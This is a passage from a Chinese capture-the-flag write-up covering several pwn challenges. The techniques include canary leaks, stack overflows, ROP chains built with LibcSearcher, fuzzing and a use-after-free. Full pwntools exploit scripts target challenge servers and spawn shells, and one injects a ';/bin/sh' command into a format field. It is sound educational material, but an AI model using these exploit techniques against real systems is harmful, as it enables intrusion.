<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p>程序提供了两种漏洞，格式化字符串和栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094746428.png" alt="image-20201216094746428"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094805753.png" alt="image-20201216094805753"></p>
<p>同时也发现了后门函数<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216094836014.png" alt="image-20201216094836014"></p>
<h4 id="思路及利用-1"><a href="#思路及利用-1" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>既然由栈溢出，那么最直接的思路就是通过栈溢出覆盖返回地址去执行后门函数。但是程序开启了canary，需要绕过。绕过的方法很多，考虑到给了格式化字符串，那么基本方向是利用格式化字符串泄露canary。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095700046.png" alt="image-20201216095700046">可以看出，canary是在ebp的上一个位置。          </p>
<p>那么接下来就是确定偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216095859731.png" alt="image-20201216095859731"></p>
<p> (0x7fffffffdde8-0x7fffffffdd60)/8 = 17，由于是64位还有6个寄存器，所以偏移一共是17+6 = 23.</p>
<p>因此exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">52579</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;battle \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(shell)<span class="comment">#栈溢出</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216100848549.png" alt="image-20201216100848549"></p>
<h3 id="3-warmup"><a href="#3-warmup" class="headerlink" title="3. warmup"></a>3. warmup</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180909635.png" alt="image-20201220180909635"></p>
<p><strong>考察知识点：fuzz</strong></p>
<p>这道题没有给附件，那么就是fuzz的题目了。</p>
<p>fuzz，也就是模糊测试。Fuzzing技术是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。</p>
<p>首先，先跑一下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202164645530.png" alt="image-20201202164645530"></p>
<p>可以看到给了一个地址。这道题难度系数不大，加上给了一个地址，因此猜测是简单的栈溢出。</p>
<p>编写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分三种情况，不用地址，用32位地址，用64位地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">p,num,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*num</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">2</span>):</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43573</span>)</span><br><span class="line">                fuzz(p,i,j)</span><br><span class="line">                text = p.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                p.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                sleep(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="4-welpwn"><a href="#4-welpwn" class="headerlink" title="4. welpwn"></a>4. welpwn</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180923482.png" alt="image-20201220180923482"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220181243613.png" alt="image-20201220181243613"></p>
<p><strong>考察知识点：滑栈、rop</strong></p>
<h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183006893.png" alt="image-20201220183006893"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220183024184.png" alt="image-20201220183024184"></p>
<p>整个程序，逻辑是主函数获取输入，在echo函数中会将输入复制到s2中，再进行输出。主函数的输入范围远大于s2，可以做到栈溢出。</p>
<p>但是需要注意的是，在复制的for循环中，如果为<code>\x00</code>会使得判断语句为0，造成循环中断。</p>
<h4 id="思路及利用-2"><a href="#思路及利用-2" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>程序只开启了堆栈不可执行保护，同时没有调用过system函数，那么只有先泄露地址再进行rop。注意到for循环不能出现<code>\x00</code>，直接借助echo泄露地址的方法就不可行了，由于是小端序，返回地址的位数一致，覆盖返回地址是可行的。</p>
<p>但是，在主函数的输入的数据仍然是在主函数的栈中，因此可以覆盖echo函数的返回地址到主函数栈帧。要返回到主函数的栈帧，要么知道地址，要么用pop之类的语句。显然，获得栈帧地址不现实，那么就寻找pop语句。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220190823145.png" alt="image-20201220190823145"></p>
<p>可以发现，最多能够一次出栈4个，而在echo函数中，覆盖到返回地址也就是需要0x20个字节，也就是说主函数的栈帧与s2在栈上的位置也就相隔0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220191614222.png" alt="image-20201220191614222"></p>
<p>可以看到，s2复制的起始地址与buf相隔0x20.因此使用之前的pop语句之后，就可以跳过覆盖s2的字节，执行泄露代码。</p>
<p>利用puts函数泄露got地址，再返回到start。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">48838</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop4 = <span class="number">0x40089c</span></span><br><span class="line">poprid = <span class="number">0x4008a3</span></span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(write_got)+p64(puts_plt)+p64(start)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RCTF\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x9c\x08\x40&quot;</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">sh = base +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop4)+p64(poprid)+p64(sh)+p64(system)+p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220194125391.png" alt="image-20201220194125391"></p>
<h3 id="5-monkey"><a href="#5-monkey" class="headerlink" title="5. monkey"></a>5. monkey</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108210709062.png" alt="image-20210108210709062"></p>
<p><strong>考察知识点：jshell绕过</strong></p>
<p>这次获取的附件比较奇怪</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165328947.png" alt="image-20201202165328947"></p>
<p>用ida打开js文件</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165908347.png" alt="image-20201202165908347"></p>
<p>发现完全看不懂是在干什么。</p>
<p>试着执行以下程序。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202170029431.png" alt="image-20201202170029431"></p>
<p>感觉像是一个shell，这道题触及了我的知识盲区。</p>
<p>网上查找wp，才知道这是个jsshell。利用JavaScript的系统调用就行。</p>
<h3 id="6-time-formatter"><a href="#6-time-formatter" class="headerlink" title="6. time_formatter"></a>6. time_formatter</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202165602237.png" alt="image-20201202165602237"></p>
<p><strong>考察知识点：堆漏洞——UAF</strong></p>
<h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p>根据程序功能，将函数重命名。</p>
<p>主函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171240776.png" alt="image-20201202171240776"></p>
<p>在set_time_format函数中，找到比较关键的输入函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171329588.png" alt="image-20201202171329588"></p>
<p>继续往下</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171507426.png" alt="image-20201202171507426"></p>
<p>这里值得注意的是strdup函数。</p>
<blockquote>
<p>定义函数：char * strdup(const char *s);</p>
<p>函数说明：strdup()会先用maolloc()配置与参数s 字符串相同的空间大小，然后将参数s字符串的内容复制到该内存地址，然后把该地址返回。该地址最后可以利用free()来释放。</p>
</blockquote>
<p>在设置时区的函数中，也发现了也会调用strdup函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202171856179.png" alt="image-20201202171856179"></p>
<p>在退出函数中发现，是先free再询问是否退出。这里就有一个UAF漏洞。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172023878.png" alt="image-20201202172023878"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172043020.png" alt="image-20201202172043020"></p>
<p>最后在打印函数中看到，command会包含format里的内容。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172125280.png" alt="image-20201202172125280"></p>
<p>也就是说，最终执行的是<code>system(/bin/date -d @unix_time &#39;format&#39;)</code>.因此，只要format里的内容是<code>&#39;;/bin/sh&#39;</code>就可以得到shell。</p>
<p>但是，注意到format输入会有一个检测函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202172403191.png" alt="image-20201202172403191"></p>
<p>format只能包含”%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# “里的内容。</p>
<h4 id="思路及利用-3"><a href="#思路及利用-3" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>上面已经知道，需要将<code>&#39;;/bin/sh&#39;</code>写入format，就要绕过检查函数。有一个UAF漏洞可以利用。思路就很清晰了：</p>
<ul>
<li>随便输入一个format。</li>
<li>调用exit函数，但不退出。（这里没有输入时区，free掉一个空指针是可以的）</li>
<li>选择输入时区，这个时候向时区中输入也就是向之前的format输入。输入需要的<code>&#39;;/bin/sh&#39;</code>。</li>
<li>输入一个时间。（打印函数能成功执行）</li>
<li>执行打印函数。</li>
</ul>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;time_formatter&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">57804</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202173811503.png" alt="image-20201202173811503"></p>
<h3 id="7-pwn-200"><a href="#7-pwn-200" class="headerlink" title="7. pwn-200"></a>7. pwn-200</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204019066.png" alt="image-20201220204019066"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204110640.png" alt="image-20201220204110640"></p>
<p><strong>考察知识点：栈溢出、rop</strong></p>
<h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204324635.png" alt="image-20201220204324635"></p>
<p>主要函数很简单，就是一个输入函数。可以看到存在栈溢出漏洞。</p>
<h4 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>因为开启了堆栈不可执行，所以shellcode不可行，考虑使用rop的方法。由于没有调用system函数，首先要泄露地址。</p>
<p>整个程序很简单，只需要简单的覆盖返回地址为write函数的plt即可。这里需要注意的是32位的传参方式与64位有所不同。</p>
<p>因此泄露函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)<span class="comment">#write(fd，addr,len)需要三个参数</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">31442</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn200&#x27;)</span></span><br><span class="line">efl = ELF(<span class="string">&#x27;pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220205838214.png" alt="image-20201220205838214"></p>
<h3 id="8-pwn1"><a href="#8-pwn1" class="headerlink" title="8. pwn1"></a>8. pwn1</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210407729.png" alt="image-20201220210407729"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210437478.png" alt="image-20201220210437478"></p>
<p><strong>考察知识点：puts函数泄露canary、栈溢出、rop</strong></p>
<h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210753716.png" alt="image-20201220210753716"></p>
<p>程序仍然十分简单，漏洞很明确就是栈溢出，堆栈不可执行，没有调用过system函数，基本思路<strong>pwn200</strong>一致，传参为64位又与<strong>welpwn</strong>类似。不过不同的是，保护中开启了canary，所以需要先泄露canary的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211118535.png" alt="image-20201220211118535">可以看出canary紧邻ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211219859.png" alt="image-20201220211219859"></p>
<h4 id="思路及利用-5"><a href="#思路及利用-5" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>因此，需要填充的垃圾数据为0x90-0x8 = 0x88。这里利用puts函数的特点，输入0x88个垃圾数据，将canary的值顺带输出。</p>
<p>传递参数需要一个<code>pop rdi ，ret</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211732114.png" alt="image-20201220211732114"></p>
<p>整个exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">57170</span>)</span><br><span class="line">prdi_addr=<span class="number">0x0400a93</span></span><br><span class="line">main_addr=<span class="number">0x0400908</span></span><br><span class="line">one_gadget_addr=<span class="number">0x45216</span></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(prdi_addr)+p64(put_got)+p64(put_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">flag=libc_base+one_gadget_addr</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(flag)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211938141.png" alt="image-20201220211938141"></p>
<h2 id="四分题"><a href="#四分题" class="headerlink" title="四分题"></a>四分题</h2><h3 id="9-note-service2"><a href="#9-note-service2" class="headerlink" title="9. note-service2"></a>9. note-service2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211122155.png" alt="image-20210108211122155"></p>
<p><strong>考察知识点：数组越界、UAF</strong></p>
